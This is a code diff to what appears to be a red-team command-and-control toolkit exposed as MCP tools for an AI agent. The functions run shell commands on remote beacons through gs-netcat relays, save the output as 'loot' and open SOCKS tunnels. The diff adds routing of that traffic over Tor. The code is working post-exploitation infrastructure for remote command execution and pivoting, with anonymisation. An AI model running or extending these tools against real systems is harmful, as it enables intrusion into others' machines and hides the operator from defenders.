@@ -32,6 +32,7 @@ import { promisify } from "node:util";
 import { assertInScope, inScope } from "../scope.js";
 import { requireCapability, capabilityPath } from "../capabilities.js";
 import { startSessionChecked, stopSession } from "../lib/sessions.js";
+import { TOR_GATE_OFF } from "../lib/exec.js";
 import {
   nextSessionId,
   registerTunnel,
@@ -234,7 +235,12 @@ function cleanGsOutput(raw: string): string {
  * pipe `cmd; echo MARKER:rc; exit` into a gs-netcat client, resolve on the
  * marker (or channel close / timeout). Full raw stream → loot file.
  */
-function runGsShell(keyFile: string, command: string, timeoutMs: number): Promise<GsShellResult> {
+function runGsShell(
+  keyFile: string,
+  command: string,
+  timeoutMs: number,
+  extraEnv: NodeJS.ProcessEnv = {}
+): Promise<GsShellResult> {
   const gsnc = requireCapability("gs-netcat");
   fs.mkdirSync(CONFIG.lootDir, { recursive: true });
   const file = path.join(
@@ -246,7 +252,7 @@ function runGsShell(keyFile: string, command: string, timeoutMs: number): Promis
   return new Promise((resolve, reject) => {
     const child = spawn(gsnc, ["-k", keyFile, "-q"], {
       stdio: ["pipe", "pipe", "pipe"],
-      env: process.env,
+      env: { ...process.env, ...extraEnv },
     });
     const out = fs.createWriteStream(file, { flags: "a" });
     let captured = "";
@@ -294,6 +300,27 @@ function runGsShell(keyFile: string, command: string, timeoutMs: number): Promis
     const sin = child.stdin!;
     sin.write(`${command} 2>&1; echo ${GS_MARK}:$?\nexit\n`, () => sin.end());
   });
+}
+
+/* --- tor env (Phase 5): gs-netcat native -T via GSOCKET_TOR ---------------- */
+
+/**
+ * gs-netcat honors GSOCKET_TOR=<socks-host:port> natively (its `-T` flag) —
+ * no proxychains wrapper needed (and proxychains would break the SRP handshake
+ * timing). Returns the env overlay, or {} when tor is off.
+ */
+function gsTorEnv(tor?: boolean): NodeJS.ProcessEnv {
+  if (!tor) return {};
+  if (!CONFIG.enableProxy) {
+    throw new Error(TOR_GATE_OFF);
+  }
+  const m = CONFIG.proxyUrl.match(/^socks5h?:\/\/([^:/]+):(\d+)$/);
+  if (!m) {
+    throw new Error(
+      `COBRA_PROXY must be socks5h://host:port (got "${CONFIG.proxyUrl}") — gs-netcat -T needs host:port.`
+    );
+  }
+  return { GSOCKET_TOR: `${m[1]}:${m[2]}` };
 }
 
 /* --- ssh deploy helpers (reuse lateral.ts argv builder) -------------------- */
@@ -514,9 +541,11 @@ export function registerC2Tools(server: McpServer): void {
       command: z.string().describe("Command for the beacon's bash, e.g. 'id; uname -a; ip a'"),
       timeout: z.number().optional().describe("Seconds to wait for completion (default 45)"),
       skip_preflight: z.boolean().optional().describe("Skip the -t peer check (default false)"),
+      tor: z.boolean().optional().describe("true = reach the relay through tor (gs-netcat -T, COBRA_ENABLE_PROXY=1)"),
     },
-    async ({ beacon, secret, command, timeout, skip_preflight }) => {
+    async ({ beacon, secret, command, timeout, skip_preflight, tor }) => {
       assertGsReady();
+      const torEnv = gsTorEnv(tor);
       const { keyFile, label, beacon: b } = resolveSecret(secret, beacon);
       if (b?.mode === "socks") {
         throw new Error(
@@ -531,7 +560,7 @@ export function registerC2Tools(server: McpServer): void {
           );
         }
       }
-      const r = await runGsShell(keyFile, command, (timeout ?? 45) * 1000);
+      const r = await runGsShell(keyFile, command, (timeout ?? 45) * 1000, torEnv);
       const status = r.timedOut
         ? `TIMED OUT after ${(r.durationMs / 1000).toFixed(0)}s — partial output below`
         : r.rc === null
@@ -559,9 +588,11 @@ export function registerC2Tools(server: McpServer): void {
       secret: z.string().optional().describe("Ad-hoc secret instead of a beacon id"),
       local_port: z.number().optional().describe("Local SOCKS port (default 1080)"),
       skip_preflight: z.boolean().optional().describe("Skip the -t peer check (default false)"),
+      tor: z.boolean().optional().describe("true = reach the relay through tor (gs-netcat -T, COBRA_ENABLE_PROXY=1)"),
     },
-    async ({ beacon, secret, local_port, skip_preflight }) => {
+    async ({ beacon, secret, local_port, skip_preflight, tor }) => {
       assertGsReady();
+      const torEnv = gsTorEnv(tor);
       const { keyFile, label } = resolveSecret(secret, beacon);
       const lport = local_port ?? 1080;
       if (await tryConnect(lport)) {
@@ -580,9 +611,10 @@ export function registerC2Tools(server: McpServer): void {
       const gsnc = requireCapability("gs-netcat");
       const info = await startSessionChecked(
         "tunnel",
-        `gs-netcat -p 127.0.0.1:${lport} (SOCKS via gs ${label})`,
+        `gs-netcat -p 127.0.0.1:${lport} (SOCKS via gs ${label}${tor ? " over tor" : ""})`,
         [gsnc, "-q", "-k", keyFile, "-p", String(lport)],
-        4000
+        4000,
+        Object.keys(torEnv).length > 0 ? { env: torEnv } : undefined
       );
       if (!(await waitForPort(lport, 10000))) {
         stopSession(info.id);
